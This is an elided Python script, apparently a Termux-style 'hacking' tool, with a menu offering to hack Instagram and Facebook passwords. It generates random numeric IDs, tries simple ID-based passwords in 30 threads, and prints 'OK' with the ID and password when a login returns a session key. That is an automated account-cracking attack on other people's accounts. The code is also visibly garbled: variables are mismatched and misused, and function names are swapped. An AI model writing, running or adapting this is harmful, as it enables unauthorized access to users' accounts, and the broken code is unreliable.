...
sys.stdout.write('\x1b[1;35m\x1b]2;🌹🌻🍂💛sanjusanjukoml 🙂💗 \x07')

try:os.mkdir('/sdcard/sanjukoml')
except:pass
...
logo= f'''\033[1;97m
                 ...
                 _       _    _____           _ 
                (_)     | |  |  _  |         | |
 ___  __ _ _ __  _ _   _| | _| |/' |_ __ ___ | |
/ __|/ _` | '_ \| | | | | |/ /  /| | '_ ` _ \| |
\__ \ (_| | | | | | |_| |   <\ |_/ / | | | | | |
|___/\__,_|_| |_| |\__,_|_|\_\\___/|_| |_| |_|_|
               _/ |                             
              |__/                              

     
\033[1;97m---------------------------------------------------
 \033[1;97m[\033[1;92m•\033[1;97m] Author   : mr sanju 
 \033[1;97m[\033[1;92m•\033[1;97m]  : acker buggu 
 \033[1;97m[\033[1;92m•\033[1;97m] GitHub   : https://github.com/Mrsanjuk0m4l/sanjukoml.git
...
def menu():
    clear()
    print(f" \033[1;97m[\033[1;92m01\033[1;97m] HACK INSTAGRAME PASWORD")
    print(f" \033[1;97m[\033[1;92m02\033[1;97m] \x1b[38;5;208mHACK FACEBOk")
    print(f" \033[1;97m[\033[1;92m03\033[1;97m] \033[1;32mENTER USERNAME")
    linex()
    younisxyz = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option : ")
    if younisxyz in ['1','01']:
        random_number()
    elif sanjusanjukoml in ['2','02']:
        os.system("xdg-open https://youtube.com/@MRTRICKERXYZ?si=OSGhb7VAn8a_QX1C")
        time.sleep(3)
        menu()
    elif sanjusanjukoml in ['3','03']:
...
def random_number():
    ...
    for _ in range(limit):
        x = "".join(hack.Instagram(string.digits) for _ in range(7))
        idz.append(x)
    with ThreadPoolExecutor(max_workers=30) as sanjukoml:
        clear()
        ...
        for xyz in idz:
            uid = code+sanjukoml
            pww = [sanjukoml,uid] 
            sanjukoml.submit(crack, uid, pww, total_idz)
    linex()
...
def crack(uid, pww, total_idz):
    ...
    global oks
    global cps
    x = hackinstagram(["\033[1;90m","\033[1;91m","\033[1;92m" ,"\x1b[38;5;208m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m"])
    sys.stdout.write(f"\r{x}[sanjusanjukoml] {loop}/{total_idz} \033[1;92m{len(oks)}\033[1;97m/\033[1;91m{len(cps)} \033[1;97m[\033[1;93m{'{:.0%}'.format(loop/float(total_idz))}\033[1;97m] ")
    sys.stdout.flush()
    try:
        for pw in pww:
            ...
            if "session_key" in po:
                print(f"\r\033[1;92m [sanjukoml-OK] {uid} | {pw}")
